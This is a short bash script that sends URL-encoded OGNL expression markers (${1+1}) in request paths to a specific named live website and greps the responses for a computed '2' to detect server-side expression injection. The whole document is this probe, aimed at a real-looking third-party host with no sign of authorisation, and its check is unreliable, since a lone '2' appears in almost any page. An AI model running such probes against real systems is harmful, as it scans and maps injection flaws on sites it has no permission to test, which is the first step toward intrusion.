URL="https://ezen.tysons.co.ke"

# Marker payloads — safe detection first (arithmetic, not execution)
for path in "/dashboard" "/%24%7B1%2B1%7D/dashboard" "/dashboard/%24%7B1%2B1%7D" \
            "/ajax/%24%7B1%2B1%7D/repairrequest" "/%24%7B1%2B1%7D" ; do
  echo "== $path =="
  curl -sk -o /dev/null -w "%{http_code}  " "${URL}/live${path}"
  curl -sk "${URL}/live${path}" | grep -o "2" | head -1
  echo
done
# If a response body/redirect contains a computed "2" instead of literal ${1+1}, OGNL evaluates → vulnerable
